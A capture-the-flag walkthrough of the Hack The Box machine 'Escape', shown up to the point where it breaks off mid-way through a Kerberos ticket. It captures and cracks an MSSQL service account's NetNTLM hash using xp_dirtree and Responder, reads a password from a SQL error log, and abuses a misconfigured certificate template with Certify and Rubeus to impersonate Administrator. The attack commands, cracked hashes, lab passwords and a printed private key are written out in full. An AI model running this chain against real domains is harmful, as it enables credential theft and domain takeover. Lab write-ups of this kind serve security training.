---
description: >-
  Medium windows box that includes stealing NTLM hash through mssql, passwords
  in logs files and privilege escalation via certificate template!
---

# Escape

## Credentials

<table data-full-width="false"><thead><tr><th>Username</th><th>Password</th><th>Description</th></tr></thead><tbody><tr><td>PublicUser</td><td>GuestUserCantWrite1</td><td>MS SQL password</td></tr><tr><td>sql_svc</td><td>REGGIE1234ronnie</td><td>AD Account responsible for running database server</td></tr><tr><td>ryan.cooper</td><td>NuclearMosquito3</td><td>Active directory user found in SQLServer logs</td></tr><tr><td>Administartor</td><td>A52F78E4C751E5F5E17E1E9F3E58F4EE</td><td>NTLM hash </td></tr></tbody></table>

## Enumeration&#x20;

### Nmap Scan

```bash

┌──(kali㉿kali)-[~/Documents/CTFs/HTB_Escape]
└─$ sudo nmap -p53,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389,49667,49689,49690,49710,49714,59666 -A -T4 10.10.11.202 -oA nmap_scan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-04 13:23 EDT
Nmap scan report for 10.10.11.202
Host is up (0.038s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-06-05 01:23:05Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.sequel.htb
| Not valid before: 2022-11-18T21:20:35
|_Not valid after:  2023-11-18T21:20:35
|_ssl-date: 2023-06-05T01:24:35+00:00; +7h59m23s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.sequel.htb
| Not valid before: 2022-11-18T21:20:35
|_Not valid after:  2023-11-18T21:20:35
|_ssl-date: 2023-06-05T01:24:35+00:00; +7h59m23s from scanner time.
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
|_ssl-date: 2023-06-05T01:24:35+00:00; +7h59m23s from scanner time.
| ms-sql-ntlm-info:
|   10.10.11.202:1433:
|     Target_Name: sequel
|     NetBIOS_Domain_Name: sequel
|     NetBIOS_Computer_Name: DC
|     DNS_Domain_Name: sequel.htb
|     DNS_Computer_Name: dc.sequel.htb
|     DNS_Tree_Name: sequel.htb
|_    Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2023-06-02T13:28:16
|_Not valid after:  2053-06-02T13:28:16
| ms-sql-info:
|   10.10.11.202:1433:
|     Version:
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-06-05T01:24:35+00:00; +7h59m23s from scanner time.
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.sequel.htb
| Not valid before: 2022-11-18T21:20:35
|_Not valid after:  2023-11-18T21:20:35
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-06-05T01:24:35+00:00; +7h59m23s from scanner time.
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.sequel.htb
| Not valid before: 2022-11-18T21:20:35
|_Not valid after:  2023-11-18T21:20:35
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49690/tcp open  msrpc         Microsoft Windows RPC
49710/tcp open  msrpc         Microsoft Windows RPC
49714/tcp open  msrpc         Microsoft Windows RPC
59666/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 2 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   311:
|_    Message signing enabled and required
| smb2-time:
|   date: 2023-06-05T01:23:57
|_  start_date: N/A
|_clock-skew: mean: 7h59m23s, deviation: 0s, median: 7h59m22s

TRACEROUTE (using port 53/tcp)
HOP RTT      ADDRESS
1   39.26 ms 10.10.14.1
2   39.43 ms 10.10.11.202

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 100.96 seconds



```

### SMB Shares

```
└─$ smbclient -L //10.10.11.202                
Password for [WORKGROUP\kali]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Public          Disk      
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.

```

There is one non-default share `Public` after trying to connect to it there is PDF file.

```
└─$ smbclient \\\\10.10.11.202\\Public
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Nov 19 06:51:25 2022
  ..                                  D        0  Sat Nov 19 06:51:25 2022
  SQL Server Procedures.pdf           A    49551  Fri Nov 18 08:39:43 2022

                5184255 blocks of size 4096. 1394427 blocks available
smb: \> get "SQL Server Procedures.pdf"
getting file \SQL Server Procedures.pdf of size 49551 as SQL Server Procedures.pdf (211.3 KiloBytes/sec) (average 211.3 KiloBytes/sec)

```

### SQL Server Procedures.pdf

This pdf contain some information about connecting to `SQL` database without `Active Directory` account.&#x20;

<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption><p>Credentials for MS SQL</p></figcaption></figure>

### MS SQL

For connection to database I used `impacket-mssql` script&#x20;

```bash
└─$ impacket-mssqlclient PublicUser:GuestUserCantWrite1@10.10.11.202                      
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC\SQLMOCK): Line 1: Changed database context to 'master'.
[*] INFO(DC\SQLMOCK): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands

```

#### Databases

```
SQL> SELECT name FROM master.dbo.sysdatabases;
name                                                                       
--------   
master
tempdb
model
msdb

```

`master`, `tempdb`, `msdb` are default databases used by `mssql` and to `model` table there is no permission for current user.

```
SQL> use model;
[-] ERROR(DC\SQLMOCK): Line 1: The server principal "PublicUser" is not able to access the database "model" under the current security context.
SQL> 
```

#### Permissions

```
SQL> use master;
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] INFO(DC\SQLMOCK): Line 1: Changed database context to 'master'.
SQL> EXEC sp_helprotect 'xp_cmdshell';
[-] ERROR(DC\SQLMOCK): Line 291: There are no matching rows on which to report.
SQL> EXEC sp_helprotect 'xp_dirtree';
Owner    Object                 Grantee        Grantor   ProtectType   Action           Column   

------   --------------------   ------------   -------   -----------   --------------   ------   
sys      xp_dirtree             public         dbo       b'Grant     '   Execute          .        

SQL> EXEC sp_helprotect 'xp_subdirs';
[-] ERROR(DC\SQLMOCK): Line 291: There are no matching rows on which to report.
SQL> EXEC sp_helprotect 'xp_fileexist';
Owner    Object                     Grantee        Grantor   ProtectType   Action           Column   

------   ------------------------   ------------   -------   -----------   --------------   ------   
sys      xp_fileexist               public         dbo       b'Grant     '   Execute          .      
```

Current user can't execute `xp_cmdshell` - this allows running shell commands on database server directly through database.

But there is permission for `xp_dirtree` command and this can be used to steal NTLM hash of user that is running database server.

This should be also possible with `xp_fileexist` but I had no luck with that function.

{% embed url="https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server#steal-netntlm-hash-relay-attack" %}
Source of MS SQL enumeration
{% endembed %}

## Stealing NTLM hash

### Setting up Responder

Responder is software that talk with most of the protocols it is focused on stealing hashes and credentials.

```

┌──(kali㉿kali)-[~/Documents/CTFs/HTB_Escape]
└─$ sudo responder -I tun0
[sudo] password for kali:
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

  To support this project:
  Patreon -> https://www.patreon.com/PythonResponder
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.109]
    Responder IPv6             [dead:beef:2::106b]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-NCM14VQ3QD4]
    Responder Domain Name      [KHXV.LOCAL]
    Responder DCE-RPC Port     [47910]

[+] Listening for events...



```

### Getting hash

<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption><p>sql_svc hash</p></figcaption></figure>

I used hashcat to crack this password

```
SQL_SVC::sequel:165adba2f72196b4:234852d74a0d58c260ce5577acc6f438:0101000000000000805e00a0eb96d90171dc1bd568df768700000000020008004b0048005800560001001e00570049004e002d004e0043004d003100340056005100330051004400340004003400570049004e002d004e0043004d00310034005600510033005100440034002e004b004800580056002e004c004f00430041004c00030014004b004800580056002e004c004f00430041004c00050014004b004800580056002e004c004f00430041004c0007000800805e00a0eb96d901060004000200000008003000300000000000000000000000003000002cb0bb94a9e9e7bd19c707d616a61d3873bc5dfaf1edda63c326f7b581e0d7180a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e003100300039000000000000000000:REGGIE1234ronnie
```

So password for `sql_svc` account is `REGGIE1234ronnie`

## Foothold

Acquired credentials have permissions to conect via remote access.

<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption><p>Connection via evil-winrm</p></figcaption></figure>

### Enumeration

I have run `winpeas` but there is nothing special in there. So next step was manual enumeration.

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption><p>SQLServer directory</p></figcaption></figure>

As there was nothing in home direcotry of `sql_svc` user and SQLServer is only one non-default directory (because of running MS SQL server) I started looking around. Only semi-interesting file is `ERRORLOG.BAK` Located at `C:\SQLServer\Logs`

<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption><p>ERRORLOG.BAK</p></figcaption></figure>

In there is password for user `ryan.cooper`&#x20;

<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

Log states `Logon failed for user 'sequel.htb\Ryan.Cooper'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]`

Next entry is `Logon failed for user 'NuclearMosquito3'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]`

`NuclearMosquito3` looks like a password so this is propably a typo from user side and he type password in username field.

<figure><img src="../../.gitbook/assets/image (11).png" alt=""><figcaption><p>Logged as ryan.cooper</p></figcaption></figure>

This was indeed password for `ryan.cooper` user and this allowed for login in his account

## Privilege Escalation

I have ran `winpeas` again but no luck there. Additionaly I gathered information about domain with `Sharphound` to analyze permissions and connections in Bloodhound but again no luck.&#x20;

<figure><img src="../../.gitbook/assets/hacker-cat.webp" alt=""><figcaption><p>Me trying to figure out how to PE</p></figcaption></figure>

But there is this trend in windows enviroment that switch for certificate authorization. There are many things that can go wrong e.g. certificate template with too wide permissions.&#x20;

To certificate be vulnerable some specyfic flags need to be set:

* `msPKI-Certificate-Name-Flag` set to `ENROLLEE_SUPPLIES_SUBJECT` this means that user requesting certificate can specify subject - effectively a user that will be authenticated
* `Access Rights` needs to `Allows Enroll` to `NT AUTHORITY\Authenticated Users` this means any logged in user can request certificate
* `pkiextendedkeyusage` needs to have set `Client Authentication` to allows impersonating another user

{% embed url="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-misconfigured-certificate-template-to-domain-admin" %}

{% embed url="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation" %}

### Vulnerable Certificate Template

For detecting any vulnerable certificate template there is handy tool `Certify`&#x20;

{% @github-files/github-code-block url="https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.7_Any/Certify.exe" %}

```

Certify completed in 00:00:00.0041996
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> .\Certify.exe find /vulnerable

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.0.0

[*] Action: Find certificate templates
[*] Using the search base 'CN=Configuration,DC=sequel,DC=htb'

[*] Listing info about the Enterprise CA 'sequel-DC-CA'

    Enterprise CA Name            : sequel-DC-CA
    DNS Hostname                  : dc.sequel.htb
    FullName                      : dc.sequel.htb\sequel-DC-CA
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=sequel-DC-CA, DC=sequel, DC=htb
    Cert Thumbprint               : A263EA89CAFE503BB33513E359747FD262F91A56
    Cert Serial                   : 1EF2FA9A7E6EADAD4F5382F4CE283101
    Cert Start Date               : 11/18/2022 12:58:46 PM
    Cert End Date                 : 11/18/2121 1:08:46 PM
    Cert Chain                    : CN=sequel-DC-CA,DC=sequel,DC=htb
    UserSpecifiedSAN              : Disabled
    CA Permissions                :
      Owner: BUILTIN\Administrators        S-1-5-32-544

      Access Rights                                     Principal

      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
      Allow  ManageCA, ManageCertificates               sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
      Allow  ManageCA, ManageCertificates               sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
    Enrollment Agent Restrictions : None

[!] Vulnerable Certificates Templates :

    CA Name                               : dc.sequel.htb\sequel-DC-CA
    Template Name                         : UserAuthentication
    Schema Version                        : 2
    Validity Period                       : 10 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
    Permissions
      Enrollment Permissions
        Enrollment Rights           : sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Domain Users           S-1-5-21-4078382237-1492182817-2568127209-513
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
      Object Control Permissions
        Owner                       : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
        WriteOwner Principals       : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
        WriteDacl Principals        : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
        WriteProperty Principals    : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519



Certify completed in 00:00:10.2010590


```

### Generating new certificate for Administrator account



`Certify` can be used to requesting new certificate for this this flags need to be supplied:

* `/ca` CA Name from previous Ceritfy output
* `/template` template name to use here `UserAuthentication`
* `/altname` name of user to impersonate

```
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> .\Certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:Administrator

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.0.0

[*] Action: Request a Certificates

[*] Current user context    : sequel\Ryan.Cooper
[*] No subject name specified, using current context as subject.

[*] Template                : UserAuthentication
[*] Subject                 : CN=Ryan.Cooper, CN=Users, DC=sequel, DC=htb
[*] AltName                 : Administrator

[*] Certificate Authority   : dc.sequel.htb\sequel-DC-CA

[*] CA Response             : The certificate had been issued.
[*] Request ID              : 20

[*] cert.pem         :

-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAtD1rsAxFkeV1cn6eKQJy7kXxYrFObMMcpJYOTaZYlbt+vfmF
wR5SK+uCrIjTwbI9fmmixZp6wboBrG9MTNOB28JuOjY2j+GPCF4ANGMSFYYAqvGG
3VFnRVkC2HqhH8waes4jHsEuaGBOuNYijQZ2BmMHif6l2K4cqKcBRMD0LSP8GOLq
midiTW0i7IFLJlUwnfQ/I3vFW/lcLTypenZGumAC8V+ehGRoLbPCnlKgf0hVaY5Z
Mvymb3+Nirqaj66vlhnIBT/ephhsBIbNSxuh0RNGVqaJXcx92QxFOuT4uTFRyzRJ
q56JH1EL5BNeCKQ7IZGpGtW0CwBcUBtz1Wa08QIDAQABAoIBAB1+P3TbTTcGeSV3
GqJTSEM9JrajlNWvR6yW8Vg7dBtsRt0HS5/COmf9bbCV4zC63d0lpAD5ukShD00M
GUwpAALZ2fekj2ET47fWyenInFjxSIKwawUkIOX0HscVqe/uEhcuTAjoS5PAzqDo
SVcSS5XX9o/aH4FJXF8slMSPXmVUS3HpddQ0TDAeLckC6QGZuagMQzo1mvT6GjIB
KRVNkfpMUBVIsOnHxHz0g2YsVqiweVdKWl6MV1G1lrCa04q7FzIJcfZPIpi0BV3N
6sRxSUPm+D84azBFhgVx34SjZG8yiYjcYfEkvtsfmD4NCRXe685knYN59v+oLL3r
uVGKZhECgYEAwmkl+Zi52dx/Q3DeJmghM1H7biJIdj0QTJR3OkXFugwhSgx9MVoW
vL+3YC6VZbcI8D3a9HqaSC7ncPiTYwaYh0E6gGxtDx224roDVvoRgos0SWlvKOMK
sYI/nj0dBa97PvDFg1vSyez/ia2S6Wt+CJ68p1603pWcs5oiDa/U0zcCgYEA7VcC
XdIcdJHpPoL5IQG+FL6CnwGP/7WooIsJWOYKa3RTSmC2WsXVx5S6xtMNOke+P6Zo
lnKEy1hA08H0s3CssbXGpOS1kfKYZEtLZdYllOJeRK4t3b3eAe6HyIrvveKug0Fq
yvRBYvWgNHKITlmLX4yoOciN0hPqw2Wooqe5nRcCgYEAtR1+WmR1KEjqaur4mvFB
lO0YfwcDWNwUljNuS+R6i5QHY1P1Qgf6zMcS0FE1r3fwpNgLZt3dY8gGp9F8hbG8
Ya1cEg5xH7cADYNb3yjDLUoAYTAPdhjmem6sU//9TLGp8P4gE/t0idf4TMxe5ITW
+rLfcFGj0QWy4gODHBsl+8sCgYByLXGOAQ5/ZdJ3qDqBjn0LLbtZEz9bHOFKmpic
k85fc06+cVhIwvPdV8ei7tVmPC1iIYQfHGiWCpblSGGYEZSCyZgOq5hN5g858J8N
FsBtp5kCIWkfS8AJ3d6ks3IyP2ME8euWR3tNSC0SDidUye8qwFgNtFXFwp8l8Tn3
RgkdcQKBgGvxLeNCfW0GDExssBxNMHyCamPYYBt8gB8tvCPm5K2e2AlkkI6PpAi0
8K1VTjA5t7R+c5eCesMPkEkiMQTip9XXmQ8HtHLZNk04u/ssjfYNdpNYQJ98OQkR
ymjs/j9GLGPayk2cu5ISlBfJsV/hlXpVSXnhF13+CbAZCYAqouSs
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIGEjCCBPqgAwIBAgITHgAAABSCZGG5pAEHoAAAAAAAFDANBgkqhkiG9w0BAQsF
ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VxdWVs
MRUwEwYDVQQDEwxzZXF1ZWwtREMtQ0EwHhcNMjMwNjA1MDI0MzA2WhcNMjUwNjA1
MDI1MzA2WjBTMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYG
c2VxdWVsMQ4wDAYDVQQDEwVVc2VyczEUMBIGA1UEAxMLUnlhbi5Db29wZXIwggEi
MA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC0PWuwDEWR5XVyfp4pAnLuRfFi
sU5swxyklg5NpliVu369+YXBHlIr64KsiNPBsj1+aaLFmnrBugGsb0xM04Hbwm46
NjaP4Y8IXgA0YxIVhgCq8YbdUWdFWQLYeqEfzBp6ziMewS5oYE641iKNBnYGYweJ
/qXYrhyopwFEwPQtI/wY4uqaJ2JNbSLsgUsmVTCd9D8je8Vb+VwtPKl6dka6YALx
X56EZGgts8KeUqB/SFVpjlky/KZvf42KupqPrq+WGcgFP96mGGwEhs1LG6HRE0ZW
poldzH3ZDEU65Pi5MVHLNEmrnokfUQvkE14IpDshkaka1bQLAFxQG3PVZrTxAgMB
AAGjggLsMIIC6DA9BgkrBgEEAYI3FQcEMDAuBiYrBgEEAYI3FQiHq/N2hdymVof9
lTWDv8NZg4nKNYF338oIhp7sKQIBZAIBBTApBgNVHSUEIjAgBggrBgEFBQcDAgYI
KwYBBQUHAwQGCisGAQQBgjcKAwQwDgYDVR0PAQH/BAQDAgWgMDUGCSsGAQQBgjcV
CgQoMCYwCgYIKwYBBQUHAwIwCgYIKwYBBQUHAwQwDAYKKwYBBAGCNwoDBDBEBgkq
hkiG9w0BCQ8ENzA1MA4GCCqGSIb3DQMCAgIAgDAOBggqhkiG9w0DBAICAIAwBwYF
Kw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFIzp/iq2SARZ5RXP8muhzjZFKU3Y
MCgGA1UdEQQhMB+gHQYKKwYBBAGCNxQCA6APDA1BZG1pbmlzdHJhdG9yMB8GA1Ud
IwQYMBaAFGKfMqOg8Dgg1GDAzW3F+lEwXsMVMIHEBgNVHR8EgbwwgbkwgbaggbOg
gbCGga1sZGFwOi8vL0NOPXNlcXVlbC1EQy1DQSxDTj1kYyxDTj1DRFAsQ049UHVi
bGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlv
bixEQz1zZXF1ZWwsREM9aHRiP2NlcnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFz
ZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2ludDCBvQYIKwYBBQUHAQEE
gbAwga0wgaoGCCsGAQUFBzAChoGdbGRhcDovLy9DTj1zZXF1ZWwtREMtQ0EsQ049
QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNv
bmZpZ3VyYXRpb24sREM9c2VxdWVsLERDPWh0Yj9jQUNlcnRpZmljYXRlP2Jhc2U/
b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1dGhvcml0eTANBgkqhkiG9w0BAQsF
AAOCAQEAptrMzr5SdcrSz7X2tZaG0facDC7iWBH8Fi3T/77VOsfZklXEdAE1VKar
Cv6oT3sIaPi+AmUuWJ+HuG/bOK8yeoqvb51nvgnyfO8u9P18EFzmQIevMjwuDuom
XBECHonxLVm6sxzi8IT5DUwEVCHIESfjPDJisnJYACNJNT/7RAXA8Upjqjhi/mTZ
suGQ2S3f5x54Ph3leLj0JtigFlQh5GFyTbeI/1cqm7DmjTBQA+r+xiau02KgrJXL
5O/QjdXeZShu7lqfyXj1Vbpo5+8UeDWd3OM4y4O/O1rltDuy2n0GNf7RWusiBOOF
BF1Xy1TV7MJqnidmafvDp5X+gE0X6g==
-----END CERTIFICATE-----


[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx



Certify completed in 00:00:13.1282912


```

After converting certificate in PEM to right format with  `openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx` as suggested in `Certify` output it need to be transfered back to windows box.

I did it by setting up python web server `python -m http.server` and downloading it on windows box `IWR http://10.10.14.109:8000/cert.pfx -Outfile cert.pfx`

<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

With certificate on the disk next we need `Rubeus` to interact with `Kerberos` and request ticket for `Administrator` account using generated certificate.

* `asktgt` mode responsible for requesting TGT tickests&#x20;
* `/user:` user to impersonate
* `/certificate:` previously generated certificate fiel
* `/getcredentials` print NTLM hash that can be used for PassTheHash attack&#x20;

{% embed url="https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.7_Any/Rubeus.exe" %}

```
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents\asdf> .\rubues.exe asktgt /user:Administrator /certificate:cert.pfx /getcredentials

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.3

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=Ryan.Cooper, CN=Users, DC=sequel, DC=htb
[*] Building AS-REQ (w/ PKINIT preauth) for: 'sequel.htb\Administrator'
[*] Using domain controller: fe80::3558:2ba9:e47e:5a3d%4:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIGSDCCBkSgAwIBBaEDAgEWooIFXjCCBVphggVWMIIFUqADAgEFoQwbClNFUVVFTC5IVEKiHzAdoAMC
      AQKhFjAUGwZrcmJ0Z3QbCnNlcXVlbC5odGKjggUaMIIFFqADAgESoQMCAQKiggUIBIIFBOgiufCBse7J
      5F8J8/y+bWsslwi+sLm7ZFtoFOeZILQ1bl1lj+VBeOO9N9k8a9hQW8YPCHBouviKTTjjp+E8lYPuyrGz
      B/SpDJfKCXVMLjsYrt+4kaIYC6Qg3iFJHN2pO9dMnpAqqTD0JKTfQJ41MFVE+sdQ8IzyT6UjKWV+iycb
      X1EY4Hv8igRMv6APGzUU8wUBflJKgCsdkpQRUCM6GL2BHcP0YGqcZ04sNPm+xZQUPQDcJ/nGvo8m7tCV
      rhVH9iVKIqRtumZjmIXCShHrxloROeZVpxREOvd+mjZcbE4zki156varmRC/urhtVwCK4s2AME7QGT3m
      a036onOM372vUe5vkIS9QEqxokvicS9r/SRivCmPXJrRaWdJFEVmKU/XOx5JQLhZK5N4GVYEcIKqCLGX
      U1lKP4Ht24OXj+co0Exfu31wNtNdDAoJ2wagMc3LRgWo7TMRcbPVCw7CQh/bg6nenCZgGBa1mzivcYNQ
      doL+KPrZ1SuucQfM28ugn1uN6wVcIE5Ujt7aqF45EwlwhK1yTnSMRYsuhsXWUxhjSLmjrieiz6wnjiQ4
      GIWxJiD9BofJqHbCb3S08Qhf/6vF6J9VqAkJTzUSNZ1xdW49bX3+1SQrgbv2FQWdNjarC9go0oA0OtWz
      /mVwU3XUvy63rBnzOMBiUdYjy0I0MOCaL7JOFPw+LWGCmiwEOExNON0vop61XzO+XA9QOPxYHxFIMEf1
      exspHAphi/+i0zl4q5o66Ay2fN0sBH7YmbGdKJ1a9dF/K3cldGysbBx8cRLR5CggdchkBp69smoa/xAM
      fbPle7MJrTekjDZW+HoJNDg4dJZvPczLg5oCeqfwA1ibm031Vq4vLz9kqXjBidEO2tuZ0lRKDm064kjL
